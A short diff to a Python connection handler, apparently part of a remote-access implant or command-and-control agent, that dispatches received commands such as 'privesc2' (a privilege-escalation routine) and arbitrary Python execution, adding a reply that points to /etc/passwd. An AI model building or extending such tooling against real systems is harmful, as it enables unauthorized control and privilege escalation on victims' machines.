@@ -172,6 +172,7 @@ def handle_conn(conn, addr):
             elif command_type == "privesc2":
                 print("Running privesc2")
                 privesc2()
+                send_framed(conn, b"Privesc2 executed: check etc/passwd")
             #Command 2: Python 
             elif command_type == "PY":
                 print("Running python")
